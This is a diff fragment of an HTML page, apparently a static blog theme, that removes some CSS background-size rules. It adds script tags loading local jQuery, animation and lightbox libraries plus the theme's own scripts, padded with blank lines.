-        -moz-background-size: cover;
-        -webkit-background-size: cover;
-        background-size: cover;
-    }
-    
-</style>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
 </html>
